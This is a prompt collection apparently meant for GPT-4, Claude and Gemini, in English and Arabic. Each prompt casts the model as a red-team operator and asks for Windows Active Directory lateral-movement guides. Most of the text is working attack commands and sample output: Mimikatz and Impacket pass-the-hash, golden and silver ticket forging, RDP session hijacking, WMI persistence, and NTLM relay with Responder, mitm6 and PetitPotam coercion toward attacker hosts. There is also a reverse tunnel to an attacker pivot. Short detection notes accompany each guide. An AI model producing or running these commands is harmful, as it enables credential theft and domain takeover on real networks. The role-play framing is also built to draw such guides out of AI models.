# Lateral Movement Techniques - Red Team Prompts

> This document contains detailed bilingual prompts for lateral movement techniques in red team operations and penetration testing.

---

## Prompt 1: Pass-the-Hash Attacks

### Description
Comprehensive guide to understanding and executing Pass-the-Hash (PtH) attacks for lateral movement in Windows environments using NTLM authentication weaknesses.

### Tags
`pass-the-hash` `ntlm` `lateral-movement` `windows` `mimikatz` `impacket`

---

## 🇬🇧 English Prompt

```
You are a senior red team operator conducting an authorized penetration test. Explain and demonstrate Pass-the-Hash (PtH) attacks for lateral movement in a Windows Active Directory environment.

Provide a comprehensive technical guide covering:

1. **Technical Foundation**
   - How NTLM authentication works
   - Why PtH attacks are possible (NTLM design weaknesses)
   - Difference between NTLM and NTLMv2 in context of PtH
   - LM hash vs NT hash storage in SAM/LSASS

2. **Attack Prerequisites**
   - Required privileges and access levels
   - Target system requirements
   - Network configuration considerations
   - UAC restrictions and Remote UAC

3. **Execution Methods**
   Using Mimikatz:
   ```
   privilege::debug
   sekurlsa::logonpasswords
   sekurlsa::pth /user:Administrator /domain:target.local /ntlm:<NT_HASH> /run:cmd.exe
   ```
   
   Using Impacket:
   ```
   impacket-wmiexec -hashes :<NT_HASH> Administrator@192.168.1.100
   impacket-psexec -hashes :<NT_HASH> DOMAIN/user@target.local
   impacket-atexec -hashes :<NT_HASH> Administrator@target.local "command"
   ```

4. **Post-Exploitation Actions**
   - Lateral movement to other systems
   - Credential harvesting from new systems
   - Maintaining access

5. **Detection & Mitigation**
   - Windows Event IDs to monitor (4624, 4625)
   - Behavioral indicators
   - Defensive measures (Protected Users, LAPS, tiered admin model)

Include practical lab setup instructions for safe testing.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت خبير في عمليات الفريق الأحمر (Red Team) تجري اختبار اختراق معتمد. اشرح ووضح هجمات تمرير التجزئة (Pass-the-Hash) للحركة الجانبية في بيئة ويندوز أكتيف دايركتوري.

قدم دليلاً تقنياً شاملاً يغطي:

1. **الأساس التقني**
   - آلية عمل مصادقة NTLM
   - لماذا هجمات تمرير التجزئة ممكنة (نقاط ضعف تصميم NTLM)
   - الفرق بين NTLM و NTLMv2 في سياق هجمات تمرير التجزئة
   - تجزئة LM مقابل تجزئة NT المخزنة في SAM/LSASS

2. **متطلبات الهجوم**
   - الصلاحيات ومستويات الوصول المطلوبة
   - متطلبات النظام المستهدف
   - اعتبارات تكوين الشبكة
   - قيود UAC و Remote UAC

3. **طرق التنفيذ**
   باستخدام Mimikatz:
   ```
   privilege::debug
   sekurlsa::logonpasswords
   sekurlsa::pth /user:Administrator /domain:target.local /ntlm:<NT_HASH> /run:cmd.exe
   ```
   
   باستخدام Impacket:
   ```
   impacket-wmiexec -hashes :<NT_HASH> Administrator@192.168.1.100
   impacket-psexec -hashes :<NT_HASH> DOMAIN/user@target.local
   impacket-atexec -hashes :<NT_HASH> Administrator@target.local "command"
   ```

4. **إجراءات ما بعد الاستغلال**
   - الحركة الجانبية إلى أنظمة أخرى
   - جمع بيانات الاعتماد من الأنظمة الجديدة
   - الحفاظ على الوصول

5. **الكشف والتخفيف**
   - معرفات أحداث ويندوز للمراقبة (4624, 4625)
   - المؤشرات السلوكية
   - التدابير الدفاعية (المستخدمون المحميون، LAPS، نموذج المسؤول المطبق)

ضع تعليمات إعداد المختبر للاختبار الآمن.
```

---

## Example Output Preview

```
=== Pass-the-Hash Attack Execution ===

Target: 192.168.1.100 (Windows Server 2019)
User: Administrator
NT Hash: 8846F7EAEE8FB117AD06BDD830B7586C

[Step 1] Verify hash extraction
mimikatz # sekurlsa::logonpasswords
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : Administrator
Domain            : TARGET
NTLM              : 8846F7eaee8fb117ad06bdd830b7586c

[Step 2] Execute PtH attack
mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:8846F7EAEE8FB117AD06BDD830B7586C

[Step 3] Lateral movement via WMI
impersonate_token Administrator
execute -f wmic -a "/node:192.168.1.101 process call create cmd.exe"

[Detection] Windows Event 4624 with Logon Type 3, NTLM SSP
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 2: Pass-the-Ticket Attacks

### Description
Detailed exploration of Kerberos ticket-based attacks including golden tickets, silver tickets, and ticket extraction techniques for lateral movement.

### Tags
`pass-the-ticket` `kerberos` `golden-ticket` `silver-ticket` `mimikatz` `active-directory`

---

## 🇬🇧 English Prompt

```
You are an advanced red team operator. Provide a comprehensive technical guide on Pass-the-Ticket (PtT) attacks targeting Kerberos authentication in Active Directory environments.

Cover the following aspects in detail:

1. **Kerberos Authentication Fundamentals**
   - TGT (Ticket Granting Ticket) structure and purpose
   - TGS (Ticket Granting Service) tickets
   - PAC (Privilege Attribute Certificate)
   - Encryption types and key dependencies

2. **Ticket Extraction Techniques**
   Extracting tickets from LSASS using Mimikatz:
   ```
   privilege::debug
   sekurlsa::tickets /export
   sekurlsa::tickets /service:krbtgt
   ```
   
   Using Rubeus:
   ```
   Rubeus.exe dump /luid:0x12345
   Rubeus.exe asktgt /user:Administrator /rc4:<HASH>
   ```

3. **Pass-the-Ticket Execution**
   ```
   mimikatz # kerberos::ptt c:\tickets\ticket.kirbi
   mimikatz # kerberos::list
   ```
   
   Cross-domain ticket usage:
   ```
   kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-XXX /krbtgt:<HASH> /sids:S-1-5-21-YYY-519 /ptt
   ```

4. **Golden Ticket Attack**
   ```
   kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-XXXXXX /krbtgt:<KRBTGT_HASH> /id:500 /groups:512,513,518,519,520 /ptt
   ```
   - Impact and persistence capabilities
   - Detection challenges

5. **Silver Ticket Attack**
   ```
   kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-XXXXXX /target:sqlserver.target.local /service:cifs /rc4:<SERVICE_HASH> /ptt
   ```

6. **Detection & Defense**
   - Event ID 4768, 4769, 4770 monitoring
   - Golden ticket indicators
   - KRBTGT password rotation strategy
   - Kerberos armoring (FAST)

Include forest trust attack scenarios and cross-realm ticket manipulation.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت مشغل متقدم في الفريق الأحمر. قدم دليلاً تقنياً شاملاً حول هجمات تمرير التذكرة (Pass-the-Ticket) التي تستهدف مصادقة Kerberos في بيئات أكتيف دايركتوري.

غط الجوانب التالية بالتفصيل:

1. **أساسيات مصادقة Kerberos**
   - هيكل TGT (تذكرة منح التذكرة) وهدفها
   - تذاكر TGS (تذكرة منح الخدمة)
   - PAC (شهادة سمة الامتياز)
   - أنواع التشفير والاعتماد على المفاتيح

2. **تقنيات استخراج التذاكر**
   استخراج التذاكر من LSASS باستخدام Mimikatz:
   ```
   privilege::debug
   sekurlsa::tickets /export
   sekurlsa::tickets /service:krbtgt
   ```
   
   باستخدام Rubeus:
   ```
   Rubeus.exe dump /luid:0x12345
   Rubeus.exe asktgt /user:Administrator /rc4:<HASH>
   ```

3. **تنفيذ هجوم تمرير التذكرة**
   ```
   mimikatz # kerberos::ptt c:\tickets\ticket.kirbi
   mimikatz # kerberos::list
   ```
   
   استخدام التذكرة عبر النطاقات:
   ```
   kerberos::golden /user:Administrator /domain:child.domain.local /sid:S-1-5-21-XXX /krbtgt:<HASH> /sids:S-1-5-21-YYY-519 /ptt
   ```

4. **هجوم التذكرة الذهبية (Golden Ticket)**
   ```
   kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-XXXXXX /krbtgt:<KRBTGT_HASH> /id:500 /groups:512,513,518,519,520 /ptt
   ```
   - التأثير وقدرات الاستمرار
   - تحديات الكشف

5. **هجوم التذكرة الفضية (Silver Ticket)**
   ```
   kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-XXXXXX /target:sqlserver.target.local /service:cifs /rc4:<SERVICE_HASH> /ptt
   ```

6. **الكشف والدفاع**
   - مراقبة معرفات الأحداث 4768, 4769, 4770
   - مؤشرات التذكرة الذهبية
   - استراتيجية تدوير كلمة مرور KRBTGT
   - حماية Kerberos (FAST)

ضمن سيناريوهات هجمات ثقة الغابة والتلاعب بالتذاكر عبر الممالك.
```

---

## Example Output Preview

```
=== Pass-the-Ticket Attack Chain ===

[Phase 1] Ticket Extraction
mimikatz # sekurlsa::tickets /export
Authentication Id : 0 ; 456789
User              : svc_sql
Domain            : TARGET.LOCAL
Ticket            : krbtgt/target.local @ target.local
End               : 1/1/2025 12:00:00 AM

[Phase 2] Golden Ticket Creation
mimikatz # kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-1234567890 /krbtgt:aes256_hash /ptt

[Phase 3] Verification
mimikatz # kerberos::list
Default principal: Administrator@target.local
Service: krbtgt/target.local

[Phase 4] Lateral Movement
C:\> dir \\fileserver.target.local\c$
Access granted - Ticket valid for 10 years

[Detection Indicators]
- Event 4768: Kerberos TGT requested
- Event 4769: Kerberos service ticket requested
- Unusual ticket lifetime
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 3: Remote Desktop Lateral Movement

### Description
Techniques for leveraging Remote Desktop Protocol (RDP) for lateral movement, including session hijacking, pass-the-hash via RDP, and restricted admin mode.

### Tags
`rdp` `remote-desktop` `session-hijacking` `lateral-movement` `windows` `terminal-services`

---

## 🇬🇧 English Prompt

```
You are a penetration testing expert specializing in Windows lateral movement. Create a detailed guide on exploiting Remote Desktop Protocol (RDP) for lateral movement operations.

Provide comprehensive coverage of:

1. **RDP Authentication Mechanisms**
   - Network Level Authentication (NLA)
   - RDP Security layers (RDP, SSL, TLS)
   - Credential Guard impact on RDP
   - Restricted Admin Mode

2. **RDP-based Lateral Movement Techniques**
   
   Standard RDP connection:
   ```
   xfreerdp /u:Administrator /d:target.local /v:192.168.1.100
   rdesktop -u Administrator -d target.local 192.168.1.100
   mstsc /v:192.168.1.100 /admin
   ```
   
   Pass-the-Hash via RDP (Restricted Admin):
   ```
   mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:<HASH> /run:"mstsc.exe /restrictedadmin"
   ```

3. **Session Hijacking**
   Query active sessions:
   ```
   query user
   query session
   ```
   
   Hijack session (requires SYSTEM):
   ```
   tscon <SESSION_ID> /dest:console
   ```
   
   Using Mimikatz for session manipulation:
   ```
   ts::sessions
   ts::remote /id:<SESSION_ID>
   ```

4. **RDP Session Harvesting**
   Extracting credentials from RDP sessions:
   ```
   mimikatz # sekurlsa::logonpasswords
   # Look for mstsc.exe processes
   ```
   
   RDP cached credentials extraction:
   ```
   lsadump::cache
   ```

5. **RDP Persistence Techniques**
   - Sticky keys backdoor via RDP
   - RDP shadowing configuration
   - Terminal Services registry modifications

6. **Stealth and Evasion**
   - RDP over reverse tunnel:
   ```
   ssh -R 3390:target:3389 attacker@pivot
   rdesktop localhost:3390
   ```

7. **Detection & Forensics**
   - Event IDs: 4624 (Type 10), 4778, 4779
   - Terminal Services logs
   - Network traffic analysis
   - Registry forensics

Include lab setup for RDP attack simulation and defense recommendations.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت خبير في اختبار الاختراق متخصص في الحركة الجانبية في ويندوز. أنشئ دليلاً مفصلاً حول استغلال بروتوكول سطح المكتب البعيد (RDP) لعمليات الحركة الجانبية.

قدم تغطية شاملة لـ:

1. **آليات مصادقة RDP**
   - مصادقة مستوى الشبكة (NLA)
   - طبقات أمان RDP (RDP، SSL، TLS)
   - تأثير Credential Guard على RDP
   - وضع المسؤول المقيد

2. **تقنيات الحركة الجانبية عبر RDP**
   
   اتصال RDP قياسي:
   ```
   xfreerdp /u:Administrator /d:target.local /v:192.168.1.100
   rdesktop -u Administrator -d target.local 192.168.1.100
   mstsc /v:192.168.1.100 /admin
   ```
   
   تمرير التجزئة عبر RDP (المسؤول المقيد):
   ```
   mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:<HASH> /run:"mstsc.exe /restrictedadmin"
   ```

3. **اختطاف الجلسات**
   الاستعلام عن الجلسات النشطة:
   ```
   query user
   query session
   ```
   
   اختطاف جلسة (يتطلب SYSTEM):
   ```
   tscon <SESSION_ID> /dest:console
   ```
   
   استخدام Mimikatz للتلاعب بالجلسات:
   ```
   ts::sessions
   ts::remote /id:<SESSION_ID>
   ```

4. **حصاد جلسات RDP**
   استخراج بيانات الاعتماد من جلسات RDP:
   ```
   mimikatz # sekurlsa::logonpasswords
   # البحث عن عمليات mstsc.exe
   ```
   
   استخراج بيانات اعتماد RDP المخزنة مؤقتاً:
   ```
   lsadump::cache
   ```

5. **تقنيات الاستمرار عبر RDP**
   - باب خلفي للمفاتيح اللاصقة عبر RDP
   - تكوين ظل RDP
   - تعديلات سجل الخدمات الطرفية

6. **التخفي والتهرب**
   - RDP عبر نفق عكسي:
   ```
   ssh -R 3390:target:3389 attacker@pivot
   rdesktop localhost:3390
   ```

7. **الكشف والطب الشرعي**
   - معرفات الأحداث: 4624 (نوع 10)، 4778، 4779
   - سجلات الخدمات الطرفية
   - تحليل حركة مرور الشبكة
   - الطب الشرعي للسجل

ضمن إعداد المختبر لمحاكاة هجوم RDP وتوصيات الدفاع.
```

---

## Example Output Preview

```
=== RDP Lateral Movement Operations ===

[Target Recon]
C:\> nmap -p 3389 --script rdp-enum-encryption 192.168.1.0/24
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
| rdp-enum-encryption: Security protocol: SSL

[Active Sessions Discovery]
C:\> query session
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>rdp-tcp#0         Administrator             1  Active
 console                                     3  Conn
 rdp-tcp                                 65536  Listen

[Session Hijack - SYSTEM Required]
C:\> tscon 1 /dest:console
Connecting session ID 1 to session console
Session ID 1 connected to session console.

[RDP Credential Harvesting]
mimikatz # sekurlsa::logonpasswords
Process: mstsc.exe (1234)
Authentication Id: 0; 789012
User: domain_admin
Domain: TARGET.LOCAL
Password: P@ssw0rd123!

[Detection Events]
Event 4624 - Logon Type 10 (RemoteInteractive)
Event 4778 - Session reconnected to workstation
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 4: WMI and PowerShell Remoting

### Description
Comprehensive guide to using Windows Management Instrumentation (WMI) and PowerShell Remoting for covert lateral movement operations.

### Tags
`wmi` `powershell` `winrm` `lateral-movement` `remote-execution` `windows`

---

## 🇬🇧 English Prompt

```
You are a red team specialist focusing on Windows remote execution. Provide an in-depth technical guide on leveraging WMI and PowerShell Remoting for lateral movement in enterprise environments.

Cover the following topics comprehensively:

1. **WMI Fundamentals for Lateral Movement**
   - WMI architecture and namespaces
   - Win32_Process class exploitation
   - WMI event subscriptions for persistence

2. **WMI Remote Execution Methods**
   
   Using wmic.exe:
   ```
   wmic /node:192.168.1.100 /user:DOMAIN\user /password:pass process call create "cmd.exe /c whoami"
   ```
   
   Using Impacket wmiexec:
   ```
   impacket-wmiexec DOMAIN/user:password@192.168.1.100 "hostname && whoami"
   impacket-wmiexec -hashes :<NT_HASH> Administrator@192.168.1.100
   ```
   
   Using PowerShell WMI:
   ```powershell
   Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName target.local -Credential $cred
   ```

3. **PowerShell Remoting Techniques**
   
   Enable PSRemoting (if disabled):
   ```powershell
   Enable-PSRemoting -Force
   Set-Item WSMan:\localhost\Client\TrustedHosts "*" -Force
   ```
   
   Enter-PSSession:
   ```powershell
   $cred = New-Object System.Management.Automation.PSCredential("DOMAIN\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
   Enter-PSSession -ComputerName target.local -Credential $cred
   ```
   
   Invoke-Command:
   ```powershell
   Invoke-Command -ComputerName target1,target2 -ScriptBlock { Get-Process } -Credential $cred
   Invoke-Command -ComputerName target.local -FilePath C:\scripts\enum.ps1
   ```
   
   One-to-many execution:
   ```powershell
   $servers = Get-Content servers.txt
   Invoke-Command -ComputerName $servers -ScriptBlock { net localgroup administrators }
   ```

4. **CIM (Common Information Model) Methods**
   ```powershell
   $sess = New-CimSession -ComputerName target.local -Credential $cred
   Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe"} -CimSession $sess
   ```

5. **Stealth and OPSEC Considerations**
   - Script block logging bypass
   - AMSI evasion techniques
   - Alternative execution methods
   - Traffic obfuscation

6. **WMI Persistence**
   ```
   wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="Persist", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
   ```

7. **Detection and Forensics**
   - WMI Activity logs (Microsoft-Windows-WMI-Activity/Operational)
   - PowerShell operational logs (4103, 4104)
   - WinRM logs
   - Network traffic patterns (ports 135, 5985, 5986)

Include practical examples of chaining WMI and PSRemoting for multi-hop lateral movement.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت متخصص في الفريق الأحمر يركز على التنفيذ عن بعد في ويندوز. قدم دليلاً تقنياً متعمقاً حول استغلال WMI و PowerShell Remoting للحركة الجانبية في بيئات المؤسسات.

غط المواضيع التالية بشكل شامل:

1. **أساسيات WMI للحركة الجانبية**
   - بنية WMI والمساحات الاسمية
   - استغلال فئة Win32_Process
   - اشتراكات أحداث WMI للاستمرار

2. **طرق التنفيذ عن بعد عبر WMI**
   
   باستخدام wmic.exe:
   ```
   wmic /node:192.168.1.100 /user:DOMAIN\user /password:pass process call create "cmd.exe /c whoami"
   ```
   
   باستخدام Impacket wmiexec:
   ```
   impacket-wmiexec DOMAIN/user:password@192.168.1.100 "hostname && whoami"
   impacket-wmiexec -hashes :<NT_HASH> Administrator@192.168.1.100
   ```
   
   باستخدام PowerShell WMI:
   ```powershell
   Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName target.local -Credential $cred
   ```

3. **تقنيات PowerShell Remoting**
   
   تفعيل PSRemoting (إذا كان معطلاً):
   ```powershell
   Enable-PSRemoting -Force
   Set-Item WSMan:\localhost\Client\TrustedHosts "*" -Force
   ```
   
   Enter-PSSession:
   ```powershell
   $cred = New-Object System.Management.Automation.PSCredential("DOMAIN\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
   Enter-PSSession -ComputerName target.local -Credential $cred
   ```
   
   Invoke-Command:
   ```powershell
   Invoke-Command -ComputerName target1,target2 -ScriptBlock { Get-Process } -Credential $cred
   Invoke-Command -ComputerName target.local -FilePath C:\scripts\enum.ps1
   ```
   
   تنفيذ واحد-للعديد:
   ```powershell
   $servers = Get-Content servers.txt
   Invoke-Command -ComputerName $servers -ScriptBlock { net localgroup administrators }
   ```

4. **طرق CIM (نموذج المعلومات المشترك)**
   ```powershell
   $sess = New-CimSession -ComputerName target.local -Credential $cred
   Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="cmd.exe"} -CimSession $sess
   ```

5. **اعتبارات التخفي والأمن التشغيلي (OPSEC)**
   - تجاوز تسجيل كتل النص البرمجي
   - تقنيات التهرب من AMSI
   - طرق التنفيذ البديلة
   - تشويش حركة المرور

6. **استمرار WMI**
   ```
   wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="Persist", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
   ```

7. **الكشف والطب الشرعي**
   - سجلات نشاط WMI (Microsoft-Windows-WMI-Activity/Operational)
   - سجلات PowerShell التشغيلية (4103، 4104)
   - سجلات WinRM
   - أنماط حركة مرور الشبكة (منافذ 135، 5985، 5986)

ضمن أمثلة عملية لربط WMI و PSRemoting للحركة الجانبية متعددة القفزات.
```

---

## Example Output Preview

```
=== WMI and PowerShell Lateral Movement ===

[WMI Remote Process Creation]
C:\> wmic /node:192.168.1.100 /user:DOMAIN\admin /password:Pass123 process call create "powershell.exe -enc JABjAGwAaQBlAG4AdAA..."
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 4567;
        ReturnValue = 0;
};

[PowerShell Remoting - Interactive]
PS C:\> Enter-PSSession -ComputerName WEB01.target.local -Credential $cred
[WEB01]: PS C:\Users\admin\Documents> whoami
TARGET\administrator

[Multi-Target Execution]
PS C:\> $targets = "WEB01","SQL01","DC01"
PS C:\> Invoke-Command -ComputerName $targets -ScriptBlock { 
    net localgroup administrators | Select-String "Domain Admins" 
}

ComputerName  Output
------------  ------
WEB01         Domain Admins
SQL01         Domain Admins

[WMI Persistence Check]
wmic /namespace:\\root\subscription PATH __EventConsumer GET /format:list

[Detection Indicators]
- Event 4688: Process creation (wmic.exe, powershell.exe)
- PowerShell Script Block Logging (Event 4104)
- WMI Activity Event ID 5861
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 5: SMB Relay Attacks

### Description
Complete technical guide to SMB relay attacks, including NTLM relay techniques, Responder tooling, and mitigation strategies for enterprise environments.

### Tags
`smb-relay` `ntlm-relay` `responder` `impacket` `lateral-movement` `man-in-the-middle`

---

## 🇬🇧 English Prompt

```
You are a senior penetration tester specializing in network attacks. Create a comprehensive guide on SMB relay attacks for lateral movement in Active Directory environments.

Provide detailed coverage of:

1. **SMB Protocol and NTLM Authentication**
   - SMB protocol versions (1, 2, 3)
   - NTLM authentication flow
   - Why relay attacks work
   - SMB signing requirements

2. **Attack Setup with Responder**
   
   Configure and launch Responder:
   ```bash
   # Analyze mode (passive)
   responder -I eth0 -A
   
   # Active relay attack
   responder -I eth0 -wF --lm
   ```
   
   Responder configuration (Responder.conf):
   ```
   [Responder Core]
   SQL = On
   SMB = On
   Kerberos = On
   FTP = On
   POP = On
   ```

3. **NTLM Relay with Impacket**
   
   Using ntlmrelayx:
   ```bash
   # Basic SMB relay
   impacket-ntlmrelayx -tf targets.txt -smb2support
   
   # Relay to LDAP for ACL attacks
   impacket-ntlmrelayx -t ldap://dc.target.local -smb2support --delegate-access
   
   # Relay to multiple protocols
   impacket-ntlmrelayx -tf targets.txt -smb2support -socks -http-port 8080
   
   # With SOCKS proxy for lateral movement
   impacket-ntlmrelayx -tf targets.txt -smb2support -socks
   proxychains impacket-wmiexec domain/user@192.168.1.100
   ```

4. **Multi-Protocol Relay Attacks**
   
   Relay to MSSQL:
   ```bash
   impacket-ntlmrelayx -t mssql://sqlserver.target.local
   ```
   
   Relay to SMTP:
   ```bash
   impacket-ntlmrelayx -t smtp://mail.target.local
   ```

5. **Advanced Techniques**
   - Drop the MIC attack
   - Cross-forest relay attacks
   - Web application to SMB relay
   - IPv6 to SMB relay (mitm6):
   ```bash
   mitm6 -d target.local &
   impacket-ntlmrelayx -t ldaps://dc.target.local -wh attacker.local
   ```

6. **Privilege Escalation via Relay**
   - Adding users via LDAP relay
   - Modifying group memberships
   - Resource-Based Constrained Delegation exploitation:
   ```bash
   impacket-ntlmrelayx -t ldaps://dc.target.local --add-computer
   impacket-ntlmrelayx -t ldaps://dc.target.local --delegate-access
   ```

7. **Coercion Techniques**
   - PetitPotam:
   ```bash
   python petitpotam.py -d target.local -u user -p pass attacker_ip dc_ip
   ```
   - PrinterBug:
   ```bash
   impacket-dcp_printerbug domain/user:pass@dc.target.local attacker_ip
   ```

8. **Detection and Mitigation**
   - SMB signing enforcement
   - Extended Protection for Authentication
   - LDAP signing requirements
   - Channel binding
   - Detection indicators (Event 4624, network anomalies)

Include a complete attack chain example from initial relay to domain compromise.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
أنت مخترق اختراق أول متخصص في هجمات الشبكات. أنشئ دليلاً شاملاً حول هجمات ترحيل SMB للحركة الجانبية في بيئات أكتيف دايركتوري.

قدم تغطية مفصلة لـ:

1. **بروتوكول SMB ومصادقة NTLM**
   - إصدارات بروتوكول SMB (1، 2، 3)
   - تدفق مصادقة NTLM
   - لماذا تعمل هجمات الترحيل
   - متطلبات توقيع SMB

2. **إعداد الهجوم باستخدام Responder**
   
   تكوين وتشغيل Responder:
   ```bash
   # وضع التحليل (سلبي)
   responder -I eth0 -A
   
   # هجوم ترحيل نشط
   responder -I eth0 -wF --lm
   ```
   
   تكوين Responder (Responder.conf):
   ```
   [Responder Core]
   SQL = On
   SMB = On
   Kerberos = On
   FTP = On
   POP = On
   ```

3. **ترحيل NTLM باستخدام Impacket**
   
   استخدام ntlmrelayx:
   ```bash
   # ترحيل SMB أساسي
   impacket-ntlmrelayx -tf targets.txt -smb2support
   
   # الترحيل إلى LDAP لهجمات ACL
   impacket-ntlmrelayx -t ldap://dc.target.local -smb2support --delegate-access
   
   # الترحيل إلى بروتوكولات متعددة
   impacket-ntlmrelayx -tf targets.txt -smb2support -socks -http-port 8080
   
   # مع بروكسي SOCKS للحركة الجانبية
   impacket-ntlmrelayx -tf targets.txt -smb2support -socks
   proxychains impacket-wmiexec domain/user@192.168.1.100
   ```

4. **هجمات الترحيل متعددة البروتوكولات**
   
   الترحيل إلى MSSQL:
   ```bash
   impacket-ntlmrelayx -t mssql://sqlserver.target.local
   ```
   
   الترحيل إلى SMTP:
   ```bash
   impacket-ntlmrelayx -t smtp://mail.target.local
   ```

5. **التقنيات المتقدمة**
   - هجوم Drop the MIC
   - هجمات الترحيل عبر الغابات
   - ترحيل تطبيق الويب إلى SMB
   - ترحيل IPv6 إلى SMB (mitm6):
   ```bash
   mitm6 -d target.local &
   impacket-ntlmrelayx -t ldaps://dc.target.local -wh attacker.local
   ```

6. **تصعيد الامتيازات عبر الترحيل**
   - إضافة مستخدمين عبر ترحيل LDAP
   - تعديل عضويات المجموعات
   - استغلال تفويض القيد المستند إلى المورد:
   ```bash
   impacket-ntlmrelayx -t ldaps://dc.target.local --add-computer
   impacket-ntlmrelayx -t ldaps://dc.target.local --delegate-access
   ```

7. **تقنيات الإكراه**
   - PetitPotam:
   ```bash
   python petitpotam.py -d target.local -u user -p pass attacker_ip dc_ip
   ```
   - PrinterBug:
   ```bash
   impacket-dcp_printerbug domain/user:pass@dc.target.local attacker_ip
   ```

8. **الكشف والتخفيف**
   - فرض توقيع SMB
   - الحماية الموسعة للمصادقة
   - متطلبات توقيع LDAP
   - ربط القناة
   - مؤشرات الكشف (الحدث 4624، الشذوذات الشبكية)

ضمن مثالاً كاملاً لسلسلة هجوم من الترحيل الأولي إلى اختراق النطاق.
```

---

## Example Output Preview

```
=== SMB Relay Attack Chain ===

[Phase 1] Network Reconnaissance
$ nmap --script=smb2-security-mode -p445 192.168.1.0/24
PORT    STATE SERVICE
445/tcp open  microsoft-ds
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required

[Phase 2] Launch Responder
$ responder -I eth0 -wF
[*] Listening for events...
[SMB] NTLMv2 Hash captured from 192.168.1.50
[SMB] User: DOMAIN\svc_account

[Phase 3] NTLM Relay Attack
$ impacket-ntlmrelayx -tf targets.txt -smb2support -socks
[*] Servers started, waiting for connections
[*] SMBD: Received connection from 192.168.1.50
[*] Authenticating against smb://192.168.1.100 as DOMAIN\ADMIN SUCCESS
[*] SOCKS: Adding DOMAIN\ADMIN@192.168.1.100 to socks pool

[Phase 4] Lateral Movement via SOCKS
$ proxychains impacket-wmiexec DOMAIN/admin@192.168.1.100 "whoami"
target\admin

[Phase 5] Domain Compromise
$ impacket-ntlmrelayx -t ldaps://dc.target.local --add-computer
[*] Added new computer: ATTACKER_PC$ with password: xYz123!

[Detection Events]
- Event 4624: An account was successfully logged on (Type 3)
- Event 4624: Multiple logons from single source
- Network: Unusual NTLM traffic patterns
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Additional Resources

### Tools Reference
| Tool | Purpose | Protocol |
|------|---------|----------|
| Mimikatz | Credential extraction, PtH/PtT | Local |
| Impacket | Remote execution, relay attacks | SMB, LDAP, WMI |
| Responder | NTLM capture, poisoning | LLMNR, NBT-NS, MDNS |
| Rubeus | Kerberos attacks | Kerberos |
| mitm6 | IPv6 DNS takeover | DHCPv6, DNS |

### Recommended Lab Environment
- Windows Server 2019/2022 (Domain Controller)
- Windows 10/11 workstations
- Kali Linux for attack tools
- Isolated VLAN for testing

### References
- MITRE ATT&CK: T1021 (Remote Services)
- MITRE ATT&CK: T1550.002 (Pass-the-Hash)
- MITRE ATT&CK: T1550.003 (Pass-the-Ticket)
- MITRE ATT&CK: T1557.001 (LLMNR/NBT-NS Poisoning and SMB Relay)

---

*This document is for authorized security testing and educational purposes only.*
